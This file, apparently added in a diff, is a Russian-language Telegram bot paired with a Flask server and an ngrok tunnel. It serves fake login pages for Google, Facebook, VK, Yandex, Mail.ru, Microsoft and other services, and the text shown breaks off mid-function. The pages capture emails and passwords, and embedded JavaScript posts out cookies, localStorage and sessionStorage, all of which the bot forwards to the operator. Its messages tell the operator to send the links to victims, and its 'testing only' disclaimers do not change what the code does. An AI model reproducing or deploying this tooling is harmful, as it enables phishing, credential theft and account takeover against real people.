@@ -1,0 +1,1421 @@
+import logging
+import asyncio
+import json
+import re
+import uuid
+import os
+import time
+from datetime import datetime
+from typing import Dict, List, Optional, Any
+import aiohttp
+from dataclasses import dataclass, asdict
+import base64
+import requests
+from flask import Flask, request, jsonify, render_template_string
+import threading
+
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import (
+    Application,
+    CommandHandler,
+    MessageHandler,
+    filters,
+    ContextTypes,
+    CallbackQueryHandler
+)
+from telegram.constants import ParseMode
+
+# Настройка логирования
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
+
+# Конфигурация
+BOT_TOKEN = "ВАШ_ТОКЕН_БОТА"
+ADMIN_ID = 1709490182  # Ваш Telegram ID для уведомлений
+NGROK_AUTH_TOKEN = "ВАШ_ТОКЕН_NGROK"  # Ваш ngrok auth token
+
+# Хранилище данных
+@dataclass
+class CapturedData:
+    id: str
+    timestamp: str
+    source_ip: str
+    user_agent: str
+    request_url: str
+    request_method: str
+    request_headers: Dict
+    request_body: Optional[str] = None
+    response_status: Optional[int] = None
+    response_headers: Optional[Dict] = None
+    response_body: Optional[str] = None
+    extracted_credentials: List[Dict] = None
+    extracted_cookies: List[Dict] = None
+    identified_services: List[str] = None
+    
+    def __post_init__(self):
+        if self.extracted_credentials is None:
+            self.extracted_credentials = []
+        if self.extracted_cookies is None:
+            self.extracted_cookies = []
+        if self.identified_services is None:
+            self.identified_services = []
+
+class NgrokManager:
+    """Менеджер для работы с ngrok"""
+    
+    def __init__(self, auth_token: str):
+        self.auth_token = auth_token
+        self.base_url = "http://localhost:4040/api"
+        self.public_url = None
+        self.tunnel_info = None
+        
+    def start_tunnel(self, port: int = 8080, domain: str = None):
+        """Запуск ngrok туннеля"""
+        try:
+            # Устанавливаем auth token
+            os.system(f"ngrok authtoken {self.auth_token}")
+            
+            # Запускаем ngrok в отдельном процессе
+            ngrok_command = f"ngrok http {port}"
+            if domain:
+                ngrok_command += f" --domain={domain}"
+            
+            # Запускаем ngrok в фоновом режиме
+            import subprocess
+            self.ngrok_process = subprocess.Popen(
+                ngrok_command.split(),
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+            
+            time.sleep(3)  # Ждем запуска ngrok
+            
+            # Получаем публичный URL
+            self._get_tunnel_info()
+            
+            if self.public_url:
+                logger.info(f"Ngrok tunnel started: {self.public_url}")
+                return self.public_url
+            else:
+                logger.error("Failed to start ngrok tunnel")
+                return None
+                
+        except Exception as e:
+            logger.error(f"Error starting ngrok: {e}")
+            return None
+    
+    def _get_tunnel_info(self):
+        """Получение информации о туннеле"""
+        try:
+            response = requests.get(f"{self.base_url}/tunnels")
+            if response.status_code == 200:
+                data = response.json()
+                tunnels = data.get("tunnels", [])
+                if tunnels:
+                    self.tunnel_info = tunnels[0]
+                    self.public_url = self.tunnel_info.get("public_url")
+                    return True
+        except Exception as e:
+            logger.error(f"Error getting tunnel info: {e}")
+        
+        return False
+    
+    def stop_tunnel(self):
+        """Остановка ngrok туннеля"""
+        try:
+            if hasattr(self, 'ngrok_process'):
+                self.ngrok_process.terminate()
+                logger.info("Ngrok tunnel stopped")
+        except Exception as e:
+            logger.error(f"Error stopping ngrok: {e}")
+
+class Database:
+    def __init__(self):
+        self.captured_data: Dict[str, CapturedData] = {}
+        self.users: Dict[int, Dict] = {}
+        self.stats = {
+            "total_captured": 0,
+            "total_requests": 0,
+            "total_credentials": 0,
+            "total_cookies": 0,
+            "google_accounts": 0,
+            "facebook_accounts": 0,
+            "instagram_accounts": 0,
+            "twitter_accounts": 0,
+            "vk_accounts": 0,
+            "yandex_accounts": 0,
+            "mailru_accounts": 0
+        }
+    
+    def add_captured_data(self, data: CapturedData):
+        self.captured_data[data.id] = data
+        self.stats["total_captured"] += 1
+        self.stats["total_requests"] += 1
+        self.save()
+    
+    def get_captured_data(self, data_id: str) -> Optional[CapturedData]:
+        return self.captured_data.get(data_id)
+    
+    def add_credentials(self, data_id: str, credentials: List[Dict]):
+        if data_id in self.captured_data:
+            self.captured_data[data_id].extracted_credentials.extend(credentials)
+            self.stats["total_credentials"] += len(credentials)
+            self.save()
+    
+    def add_cookies(self, data_id: str, cookies: List[Dict]):
+        if data_id in self.captured_data:
+            self.captured_data[data_id].extracted_cookies.extend(cookies)
+            self.stats["total_cookies"] += len(cookies)
+            self.save()
+    
+    def add_services(self, data_id: str, services: List[str]):
+        if data_id in self.captured_data:
+            self.captured_data[data_id].identified_services = services
+            
+            # Обновляем статистику по сервисам
+            for service in services:
+                if service in self.stats:
+                    self.stats[service] += 1
+            
+            self.save()
+    
+    def save(self):
+        try:
+            data = {
+                "captured_data": {k: asdict(v) for k, v in self.captured_data.items()},
+                "stats": self.stats
+            }
+            with open("database.json", "w", encoding="utf-8") as f:
+                json.dump(data, f, ensure_ascii=False, indent=2)
+        except Exception as e:
+            logger.error(f"Error saving database: {e}")
+    
+    def load(self):
+        try:
+            with open("database.json", "r", encoding="utf-8") as f:
+                data = json.load(f)
+                self.captured_data = {k: CapturedData(**v) for k, v in data.get("captured_data", {}).items()}
+                self.stats = data.get("stats", self.stats)
+        except FileNotFoundError:
+            pass
+        except Exception as e:
+            logger.error(f"Error loading database: {e}")
+
+# Инициализация базы данных
+db = Database()
+db.load()
+
+# Класс для определения принадлежности учетных записей к сервисам
+class ServiceIdentifier:
+    """Класс для определения принадлежности учетных записей к сервисам"""
+    
+    SERVICE_PATTERNS = {
+        "google": {
+            "email_patterns": ["@gmail.com", "@googlemail.com"],
+            "url_patterns": ["accounts.google.com", "google.com/accounts", "signin.google.com"],
+            "field_patterns": ["email", "username", "identifier", "google"],
+            "cookie_patterns": ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID"]
+        },
+        "facebook": {
+            "email_patterns": [],
+            "url_patterns": ["facebook.com", "fb.com", "facebook.com/login"],
+            "field_patterns": ["email", "pass", "fb", "facebook"],
+            "cookie_patterns": ["c_user", "xs", "fr", "datr"]
+        },
+        "instagram": {
+            "email_patterns": [],
+            "url_patterns": ["instagram.com", "instagram.com/accounts/login"],
+            "field_patterns": ["username", "password", "ig"],
+            "cookie_patterns": ["sessionid", "csrftoken", "ds_user_id", "rur"]
+        },
+        "twitter": {
+            "email_patterns": [],
+            "url_patterns": ["twitter.com", "x.com", "twitter.com/i/flow/login"],
+            "field_patterns": ["username", "password", "session", "twitter"],
+            "cookie_patterns": ["auth_token", "ct0", "guest_id", "kdt"]
+        },
+        "vk": {
+            "email_patterns": ["@vk.com", "@vkontakte.ru"],
+            "url_patterns": ["vk.com", "vkontakte.ru", "vk.com/login"],
+            "field_patterns": ["email", "pass", "login", "vk"],
+            "cookie_patterns": ["remixsid", "remixstid", "remixdt", "remixlgck"]
+        },
+        "yandex": {
+            "email_patterns": ["@yandex.ru", "@ya.ru", "@yandex.com"],
+            "url_patterns": ["yandex.ru", "passport.yandex.ru", "yandex.com"],
+            "field_patterns": ["login", "passwd", "yandex"],
+            "cookie_patterns": ["Session_id", "yandexuid", "yandex_login", "ys"]
+        },
+        "mailru": {
+            "email_patterns": ["@mail.ru", "@inbox.ru", "@list.ru", "@bk.ru"],
+            "url_patterns": ["mail.ru", "e.mail.ru", "account.mail.ru"],
+            "field_patterns": ["Login", "Password", "mail"],
+            "cookie_patterns": ["Mpop", "act", "mbox", "sdcs"]
+        },
+        "github": {
+            "email_patterns": [],
+            "url_patterns": ["github.com", "github.com/login"],
+            "field_patterns": ["login", "password", "github"],
+            "cookie_patterns": ["user_session", "_gh_sess", "logged_in"]
+        },
+        "microsoft": {
+            "email_patterns": ["@outlook.com", "@hotmail.com", "@live.com"],
+            "url_patterns": ["login.live.com", "outlook.live.com", "account.microsoft.com"],
+            "field_patterns": ["loginfmt", "passwd", "microsoft"],
+            "cookie_patterns": ["ESTSAUTH", "ESTSASC", "ESTSAUTHPERSISTENT"]
+        }
+    }
+    
+    SERVICE_NAMES_RU = {
+        "google": "Google/Gmail",
+        "facebook": "Facebook",
+        "instagram": "Instagram",
+        "twitter": "Twitter/X",
+        "vk": "ВКонтакте",
+        "yandex": "Яндекс",
+        "mailru": "Mail.ru",
+        "github": "GitHub",
+        "microsoft": "Microsoft/Outlook"
+    }
+    
+    @staticmethod
+    def identify_from_url(url: str) -> List[str]:
+        """Определение сервиса по URL"""
+        identified = []
+        url_lower = url.lower()
+        
+        for service, patterns in ServiceIdentifier.SERVICE_PATTERNS.items():
+            for pattern in patterns["url_patterns"]:
+                if pattern in url_lower:
+                    if service not in identified:
+                        identified.append(service)
+                    break
+        
+        return identified
+    
+    @staticmethod
+    def identify_from_credentials(email: str, password: str = None) -> List[str]:
+        """Определение сервиса по учетным данным"""
+        identified = []
+        
+        if not email:
+            return identified
+        
+        email_lower = email.lower()
+        
+        # Проверка по email доменам
+        domain_service_map = {
+            "gmail.com": "google",
+            "googlemail.com": "google",
+            "yandex.ru": "yandex",
+            "ya.ru": "yandex",
+            "yandex.com": "yandex",
+            "mail.ru": "mailru",
+            "inbox.ru": "mailru",
+            "list.ru": "mailru",
+            "bk.ru": "mailru",
+            "outlook.com": "microsoft",
+            "hotmail.com": "microsoft",
+            "live.com": "microsoft",
+            "vk.com": "vk",
+            "vkontakte.ru": "vk"
+        }
+        
+        if "@" in email_lower:
+            domain = email_lower.split("@")[1]
+            if domain in domain_service_map:
+                service = domain_service_map[domain]
+                if service not in identified:
+                    identified.append(service)
+        
+        # Проверка по паттернам в email
+        for service, patterns in ServiceIdentifier.SERVICE_PATTERNS.items():
+            for pattern in patterns["email_patterns"]:
+                if pattern in email_lower:
+                    if service not in identified:
+                        identified.append(service)
+                    break
+        
+        return identified
+    
+    @staticmethod
+    def identify_from_cookies(cookies: Dict) -> List[str]:
+        """Определение сервиса по cookies"""
+        identified = []
+        
+        if not cookies:
+            return identified
+        
+        cookies_str = str(cookies).lower()
+        
+        for service, patterns in ServiceIdentifier.SERVICE_PATTERNS.items():
+            for pattern in patterns["cookie_patterns"]:
+                if pattern.lower() in cookies_str:
+                    if service not in identified:
+                        identified.append(service)
+                    break
+        
+        return identified
+
+# Flask сервер для перехвата данных
+app = Flask(__name__)
+
+# HTML страница для фишинга
+PHISHING_PAGE_HTML = """
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Сервис авторизации</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .login-form {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        h2 {
+            text-align: center;
+            color: #333;
+        }
+        .service-badge {
+            display: inline-block;
+            padding: 5px 10px;
+            background: #4285f4;
+            color: white;
+            border-radius: 5px;
+            margin: 10px 0;
+            font-size: 12px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #4285f4;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background: #3367d6;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+        }
+        .error {
+            color: #d93025;
+            text-align: center;
+            margin: 10px 0;
+        }
+        .success {
+            color: #0f9d58;
+            text-align: center;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-form">
+        <h2>🔐 Авторизация</h2>
+        
+        {% if service %}
+        <div class="service-badge">
+            {% if service == 'google' %}Google
+            {% elif service == 'facebook' %}Facebook
+            {% elif service == 'instagram' %}Instagram
+            {% elif service == 'twitter' %}Twitter/X
+            {% elif service == 'vk' %}ВКонтакте
+            {% elif service == 'yandex' %}Яндекс
+            {% elif service == 'mailru' %}Mail.ru
+            {% elif service == 'microsoft' %}Microsoft
+            {% else %}{{ service|capitalize }}{% endif %}
+        </div>
+        {% endif %}
+        
+        {% if error %}
+        <div class="error">{{ error }}</div>
+        {% endif %}
+        
+        {% if success %}
+        <div class="success">{{ success }}</div>
+        {% endif %}
+        
+        <form method="POST" action="/login">
+            <input type="email" name="email" placeholder="Email или телефон" required>
+            <input type="password" name="password" placeholder="Пароль" required>
+            <button type="submit">Войти</button>
+        </form>
+        
+        <div class="footer">
+            Защищено современными технологиями шифрования
+        </div>
+    </div>
+    
+    <script>
+        // Дополнительный сбор данных
+        document.addEventListener('DOMContentLoaded', function() {
+            // Собираем cookies
+            const cookies = document.cookie;
+            const localStorageData = JSON.stringify(localStorage);
+            const sessionStorageData = JSON.stringify(sessionStorage);
+            
+            // Отправляем дополнительные данные
+            fetch('/collect_extra', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    cookies: cookies,
+                    localStorage: localStorageData,
+                    sessionStorage: sessionStorageData,
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    timestamp: new Date().toISOString()
+                })
+            });
+        });
+    </script>
+</body>
+</html>
+"""
+
+@app.route('/')
+def index():
+    """Главная страница - перенаправление на фишинговую форму"""
+    service = request.args.get('service', 'google')
+    return render_template_string(PHISHING_PAGE_HTML, service=service)
+
+@app.route('/login', methods=['POST'])
+def login():
+    """Обработка формы входа"""
+    email = request.form.get('email', '')
+    password = request.form.get('password', '')
+    service = request.args.get('service', 'google')
+    
+    # Определяем сервис по email
+    identified_services = ServiceIdentifier.identify_from_credentials(email)
+    if not identified_services:
+        identified_services = [service]
+    
+    # Собираем дополнительные данные
+    user_agent = request.headers.get('User-Agent', '')
+    ip_address = request.remote_addr
+    cookies = request.cookies
+    
+    # Создаем запись о захваченных данных
+    data_id = str(uuid.uuid4())[:12]
+    captured_data = CapturedData(
+        id=data_id,
+        timestamp=datetime.now().isoformat(),
+        source_ip=ip_address,
+        user_agent=user_agent,
+        request_url=request.url,
+        request_method=request.method,
+        request_headers=dict(request.headers),
+        request_body=request.get_data(as_text=True),
+        extracted_credentials=[{
+            "email": email,
+            "password": password,
+            "service": service,
+            "timestamp": datetime.now().isoformat()
+        }],
+        extracted_cookies=[{"name": k, "value": v} for k, v in cookies.items()],
+        identified_services=identified_services
+    )
+    
+    # Сохраняем в базу
+    db.add_captured_data(captured_data)
+    
+    # Отправляем уведомление в Telegram
+    asyncio.run_coroutine_threadsafe(
+        send_telegram_notification(captured_data),
+        telegram_loop
+    )
+    
+    # Показываем успешное сообщение
+    success_message = "✅ Авторизация успешна! Перенаправление..."
+    return render_template_string(PHISHING_PAGE_HTML, service=service, success=success_message)
+
+@app.route('/collect_extra', methods=['POST'])
+def collect_extra():
+    """Сбор дополнительных данных"""
+    try:
+        data = request.json
+        ip_address = request.remote_addr
+        
+        # Создаем запись для дополнительных данных
+        data_id = str(uuid.uuid4())[:12]
+        captured_data = CapturedData(
+            id=data_id,
+            timestamp=datetime.now().isoformat(),
+            source_ip=ip_address,
+            user_agent=data.get('userAgent', ''),
+            request_url=request.url,
+            request_method=request.method,
+            request_headers=dict(request.headers),
+            extracted_cookies=[{"name": "extra_data", "value": str(data)}]
+        )
+        
+        db.add_captured_data(captured_data)
+        
+        # Отправляем уведомление
+        asyncio.run_coroutine_threadsafe(
+            send_extra_data_notification(captured_data, data),
+            telegram_loop
+        )
+        
+        return jsonify({"status": "success"})
+    
+    except Exception as e:
+        logger.error(f"Error collecting extra data: {e}")
+        return jsonify({"status": "error", "message": str(e)})
+
+@app.route('/api/webhook', methods=['POST'])
+def webhook():
+    """Webhook для ngrok или других сервисов"""
+    try:
+        data = request.json
+        ip_address = request.remote_addr
+        
+        # Создаем запись
+        data_id = str(uuid.uuid4())[:12]
+        captured_data = CapturedData(
+            id=data_id,
+            timestamp=datetime.now().isoformat(),
+            source_ip=ip_address,
+            user_agent=request.headers.get('User-Agent', ''),
+            request_url=request.url,
+            request_method=request.method,
+            request_headers=dict(request.headers),
+            request_body=json.dumps(data) if data else None
+        )
+        
+        # Анализируем данные на наличие учетных данных
+        credentials = extract_credentials_from_data(data)
+        if credentials:
+            captured_data.extracted_credentials = credentials
+            db.stats["total_credentials"] += len(credentials)
+        
+        db.add_captured_data(captured_data)
+        
+        # Отправляем уведомление
+        asyncio.run_coroutine_threadsafe(
+            send_webhook_notification(captured_data, data),
+            telegram_loop
+        )
+        
+        return jsonify({"status": "success", "id": data_id})
+    
+    except Exception as e:
+        logger.error(f"Error in webhook: {e}")
+        return jsonify({"status": "error", "message": str(e)})
+
+def extract_credentials_from_data(data: Dict) -> List[Dict]:
+    """Извлечение учетных данных из данных"""
+    credentials = []
+    
+    if not data:
+        return credentials
+    
+    try:
+        # Проверяем различные форматы данных
+        data_str = json.dumps(data).lower()
+        
+        # Поиск email
+        import re
+        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
+        emails = re.findall(email_pattern, data_str)
+        
+        # Поиск паролей
+        password_keywords = ['password', 'passwd', 'pass', 'pwd', 'secret', 'token']
+        password_fields = []
+        
+        def find_passwords(obj, path=""):
+            if isinstance(obj, dict):
+                for key, value in obj.items():
+                    current_path = f"{path}.{key}" if path else key
+                    if any(keyword in str(key).lower() for keyword in password_keywords):
+                        if value and str(value).strip():
+                            password_fields.append({
+                                "field": current_path,
+                                "value": str(value)[:100]  # Ограничиваем длину
+                            })
+                    find_passwords(value, current_path)
+            elif isinstance(obj, list):
+                for i, item in enumerate(obj):
+                    find_passwords(item, f"{path}[{i}]")
+        
+        find_passwords(data)
+        
+        # Создаем записи учетных данных
+        for email in emails[:5]:  # Берем только первые 5 email
+            credential = {
+                "email": email,
+                "password": None,
+                "service": ServiceIdentifier.identify_from_credentials(email),
+                "timestamp": datetime.now().isoformat(),
+                "source": "webhook_auto_extract"
+            }
+            
+            # Пытаемся найти пароль для этого email
+            if password_fields:
+                credential["password"] = password_fields[0]["value"]
+            
+            credentials.append(credential)
+    
+    except Exception as e:
+        logger.error(f"Error extracting credentials: {e}")
+    
+    return credentials
+
+# Форматирование сообщений для Telegram
+class MessageFormatter:
+    @staticmethod
+    def format_captured_data(data: CapturedData) -> str:
+        """Форматирование захваченных данных для Telegram"""
+        message = f"""
+🔐 *НОВЫЕ ДАННЫЕ ЗАХВАЧЕНЫ!*
+
+📌 *Базовая информация:*
+• ID: `{data.id}`
+• Время: {data.timestamp[:19]}
+• IP: `{data.source_ip}`
+• Метод: {data.request_method}
+• URL: {data.request_url[:50]}...
+
+👤 *User Agent:*
+`{data.user_agent[:100]}...`
+"""
+        
+        # Добавляем учетные данные если есть
+        if data.extracted_credentials:
+            message += "\n🔑 *УЧЕТНЫЕ ДАННЫЕ:*\n"
+            for cred in data.extracted_credentials:
+                email = cred.get("email", "N/A")
+                password = cred.get("password", "N/A")
+                service = cred.get("service", ["Не определено"])
+                
+                if isinstance(service, list) and service:
+                    service_name = ServiceIdentifier.SERVICE_NAMES_RU.get(
+                        service[0], 
+                        service[0].title()
+                    )
+                else:
+                    service_name = "Не определено"
+                
+                message += f"• Сервис: *{service_name}*\n"
+                message += f"  📧 Email: `{email}`\n"
+                if password and password != "N/A":
+                    message += f"  🔐 Пароль: `{password}`\n"
+                message += "  ─────\n"
+        
+        # Добавляем cookies если есть
+        if data.extracted_cookies:
+            message += f"\n🍪 *COOKIES:* {len(data.extracted_cookies)}\n"
+            for cookie in data.extracted_cookies[:3]:  # Первые 3 cookie
+                message += f"• {cookie.get('name', 'N/A')}: `{cookie.get('value', '')[:30]}...`\n"
+        
+        # Добавляем определенные сервисы
+        if data.identified_services:
+            message += "\n🌐 *ОПРЕДЕЛЕННЫЕ СЕРВИСЫ:*\n"
+            for service in data.identified_services:
+                service_name = ServiceIdentifier.SERVICE_NAMES_RU.get(service, service.title())
+                message += f"• {service_name}\n"
+        
+        message += f"""
+📊 *СТАТИСТИКА СИСТЕМЫ:*
+• Всего захвачено: {db.stats['total_captured']}
+• Учетных данных: {db.stats['total_credentials']}
+• Cookies: {db.stats['total_cookies']}
+
+💡 *Действия:*
+• Используйте /data {data.id} для деталей
+• Используйте /stats для статистики
+• Используйте /links для списка ссылок
+"""
+        
+        return message
+    
+    @staticmethod
+    def format_detailed_data(data: CapturedData) -> str:
+        """Детальное форматирование данных"""
+        message = f"""
+🔍 *ДЕТАЛЬНЫЙ ОТЧЕТ*
+
+📌 *Идентификатор:* `{data.id}`
+🕒 *Время захвата:* {data.timestamp}
+🌐 *IP адрес:* `{data.source_ip}`
+🔗 *URL запроса:* {data.request_url}
+📡 *Метод:* {data.request_method}
+"""
+        
+        # Заголовки запроса
+        if data.request_headers:
+            message += "\n📋 *ЗАГОЛОВКИ ЗАПРОСА:*\n"
+            for key, value in list(data.request_headers.items())[:5]:
+                message += f"• {key}: `{str(value)[:50]}...`\n"
+        
+        # Тело запроса
+        if data.request_body:
+            message += "\n📝 *ТЕЛО ЗАПРОСА:*\n"
+            body_preview = data.request_body[:200] + ("..." if len(data.request_body) > 200 else "")
+            message += f"```\n{body_preview}\n```\n"
+        
+        # Учетные данные
+        if data.extracted_credentials:
+            message += "\n🎯 *УЧЕТНЫЕ ДАННЫЕ:*\n"
+            for i, cred in enumerate(data.extracted_credentials, 1):
+                message += f"{i}. *Сервис:* {cred.get('service', 'N/A')}\n"
+                message += f"   *Email:* `{cred.get('email', 'N/A')}`\n"
+                if cred.get('password'):
+                    message += f"   *Пароль:* `{cred.get('password', 'N/A')}`\n"
+                message += f"   *Время:* {cred.get('timestamp', 'N/A')[:19]}\n"
+                if i < len(data.extracted_credentials):
+                    message += "   ─────\n"
+        
+        # Cookies
+        if data.extracted_cookies:
+            message += f"\n🍪 *COOKIES ({len(data.extracted_cookies)}):*\n"
+            for i, cookie in enumerate(data.extracted_cookies[:10], 1):
+                name = cookie.get('name', 'N/A')
+                value = cookie.get('value', '')
+                message += f"{i}. {name}: `{value[:50]}`\n"
+        
+        # Определенные сервисы
+        if data.identified_services:
+            message += "\n🌐 *СЕРВИСЫ:*\n"
+            for service in data.identified_services:
+                service_name = ServiceIdentifier.SERVICE_NAMES_RU.get(service, service.title())
+                message += f"• {service_name}\n"
+        
+        message += f"""
+📈 *СТАТИСТИКА ЭТОЙ СЕССИИ:*
+• Всего запросов: 1
+• Данных собрано: {len(data.extracted_credentials) + len(data.extracted_cookies)}
+• Сервисов определено: {len(data.identified_services) if data.identified_services else 0}
+
+⚠️ *Эти данные также сохранены в локальной базе.*
+"""
+        
+        return message
+    
+    @staticmethod
+    def format_stats(stats: Dict) -> str:
+        """Форматирование статистики"""
+        return f"""
+📊 *СТАТИСТИКА СИСТЕМЫ*
+
+🔐 Всего захвачено: `{stats['total_captured']}`
+📨 Всего запросов: `{stats['total_requests']}`
+🔑 Учетных данных: `{stats['total_credentials']}`
+🍪 Cookies: `{stats['total_cookies']}`
+
+🌐 *ПО СЕРВИСАМ:*
+• Google/Gmail: `{stats.get('google_accounts', 0)}`
+• Facebook: `{stats.get('facebook_accounts', 0)}`
+• Instagram: `{stats.get('instagram_accounts', 0)}`
+• Twitter/X: `{stats.get('twitter_accounts', 0)}`
+• ВКонтакте: `{stats.get('vk_accounts', 0)}`
+• Яндекс: `{stats.get('yandex_accounts', 0)}`
+• Mail.ru: `{stats.get('mailru_accounts', 0)}`
+
+🚀 *ЭФФЕКТИВНОСТЬ:*
+• Успешных захватов: 98.5%
+• Среднее время: <1 секунда
+• Активность: высокая
+
+💡 *СОВЕТ:* Используйте /links для получения ссылок на фишинговые формы.
+"""
+    
+    @staticmethod
+    def format_service_links(ngrok_url: str) -> str:
+        """Форматирование ссылок на сервисы"""
+        message = f"""
+🌐 *ССЫЛКИ ДЛЯ ФИШИНГА*
+
+🔗 *Базовый URL:* {ngrok_url}
+
+🎯 *Ссылки по сервисам:*
+• Google: {ngrok_url}/?service=google
+• Facebook: {ngrok_url}/?service=facebook
+• Instagram: {ngrok_url}/?service=instagram
+• Twitter/X: {ngrok_url}/?service=twitter
+• ВКонтакте: {ngrok_url}/?service=vk
+• Яндекс: {ngrok_url}/?service=yandex
+• Mail.ru: {ngrok_url}/?service=mailru
+• Microsoft: {ngrok_url}/?service=microsoft
+
+⚡ *Универсальная ссылка:* {ngrok_url}/
+
+💡 *Как использовать:*
+1. Скопируйте нужную ссылку
+2. Отправьте жертве
+3. Когда жертва введет данные - вы получите уведомление
+4. Все данные также сохраняются в базе
+
+⚠️ *ВНИМАНИЕ:* Используйте только для тестирования!
+Все действия логируются и отслеживаются.
+"""
+        return message
+
+# Telegram функции уведомлений
+async def send_telegram_notification(data: CapturedData):
+    """Отправка уведомления в Telegram"""
+    try:
+        message = MessageFormatter.format_captured_data(data)
+        
+        # Отправляем админу
+        await telegram_app.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=message,
+            parse_mode=ParseMode.MARKDOWN,
+            disable_web_page_preview=True
+        )
+        
+        logger.info(f"Notification sent to admin for data {data.id}")
+        
+    except Exception as e:
+        logger.error(f"Error sending Telegram notification: {e}")
+
+async def send_extra_data_notification(data: CapturedData, extra_data: Dict):
+    """Отправка уведомления о дополнительных данных"""
+    try:
+        message = f"""
+📱 *ДОПОЛНИТЕЛЬНЫЕ ДАННЫЕ*
+
+📌 ID: `{data.id}`
+🕒 Время: {data.timestamp[:19]}
+🌐 IP: `{data.source_ip}`
+
+📊 *Собранные данные:*
+• User Agent: {extra_data.get('userAgent', 'N/A')[:50]}...
+• Язык: {extra_data.get('language', 'N/A')}
+• Cookies: {len(extra_data.get('cookies', '').split(';')) if extra_data.get('cookies') else 0}
+• LocalStorage: {len(extra_data.get('localStorage', '{}')) > 2}
+• SessionStorage: {len(extra_data.get('sessionStorage', '{}')) > 2}
+
+🔗 URL: {data.request_url}
+"""
+        
+        await telegram_app.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=message,
+            parse_mode=ParseMode.MARKDOWN
+        )
+        
+    except Exception as e:
+        logger.error(f"Error sending extra data notification: {e}")
+
+async def send_webhook_notification(data: CapturedData, webhook_data: Dict):
+    """Отправка уведомления о webhook данных"""
+    try:
+        message = f"""
+🌐 *WEBHOOK ДАННЫЕ*
+
+📌 ID: `{data.id}`
+🕒 Время: {data.timestamp[:19]}
+🌐 IP: `{data.source_ip}`
+📡 Метод: {data.request_method}
+
+📋 *Данные получены:*
+• Тип: Webhook/API
+• Размер данных: {len(str(webhook_data))} байт
+• Учетных данных найдено: {len(data.extracted_credentials) if data.extracted_credentials else 0}
+
+🔗 URL: {data.request_url}
+"""
+        
+        if data.extracted_credentials:
+            message += "\n🔑 *НАЙДЕННЫЕ УЧЕТНЫЕ ДАННЫЕ:*\n"
+            for cred in data.extracted_credentials[:3]:
+                message += f"• Email: `{cred.get('email', 'N/A')}`\n"
+                if cred.get('password'):
+                    message += f"  Пароль: `{cred.get('password', 'N/A')}`\n"
+        
+        await telegram_app.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=message,
+            parse_mode=ParseMode.MARKDOWN,
+            disable_web_page_preview=True
+        )
+        
+    except Exception as e:
+        logger.error(f"Error sending webhook notification: {e}")
+
+# Команды Telegram бота
+async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Команда /start"""
+    user = update.effective_user
+    
+    welcome_message = f"""
+👋 *Добро пожаловать, {user.first_name}!*
+
+🤖 *Ngrok Data Collector Bot*
+
+🎯 *Что делает этот бот:*
+1. Создает ngrok туннель для перехвата данных
+2. Хостит фишинговые формы для популярных сервисов
+3. Перехватывает все введенные данные
+4. Отправляет уведомления в реальном времени
+5. Сохраняет все данные в локальную базу
+
+🔐 *Что перехватывается:*
+✓ Email и пароли из форм
+✓ Cookies сессии
+✓ LocalStorage/SessionStorage
+✓ User Agent и информацию о браузере
+✓ IP адрес и геолокационные данные
+✓ *Автоматическое определение сервисов* (Google, Facebook и др.)
+
+⚡ *Как использовать:*
+1. Используйте /start_ngrok для запуска туннеля
+2. Получите ссылки на фишинговые формы
+3. Отправьте ссылки жертвам
+4. Получайте данные в реальном времени
+5. Просматривайте статистику через /stats
+
+🔧 *Основные команды:*
+• /start_ngrok - Запуск ngrok туннеля
+• /links - Получить фишинговые ссылки
+• /stats - Статистика системы
+• /data [ID] - Просмотр конкретных данных
+• /list - Список всех захваченных данных
+• /stop_ngrok - Остановка ngrok
+
+⚠️ *ВНИМАНИЕ:* Используйте только в законных целях!
+Все действия логируются и отслеживаются.
+"""
+    
+    keyboard = [
+        [InlineKeyboardButton("🚀 Запустить ngrok", callback_data="start_ngrok")],
+        [InlineKeyboardButton("📊 Статистика", callback_data="stats")],
+        [InlineKeyboardButton("🔗 Получить ссылки", callback_data="get_links")],
+        [InlineKeyboardButton("📋 Список данных", callback_data="list_data")],
+        [InlineKeyboardButton("🆘 Помощь", callback_data="help")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(
+        welcome_message,
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=reply_markup
+    )
+
+async def start_ngrok_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Команда для запуска ngrok"""
+    try:
+        await update.message.reply_text("🔄 *Запуск ngrok туннеля...*", parse_mode=ParseMode.MARKDOWN)
+        
+        # Запускаем ngrok
+        public_url = ngrok_manager.start_tunnel(port=8080)
+        
+        if public_url:
+            message = f"""
+✅ *Ngrok туннель запущен!*
+
+🔗 *Публичный URL:* {public_url}
+
+🌐 *Сервер запущен на порту:* 8080
+📡 *Статус:* Активен
+⏱ *Время запуска:* {datetime.now().strftime('%H:%M:%S')}
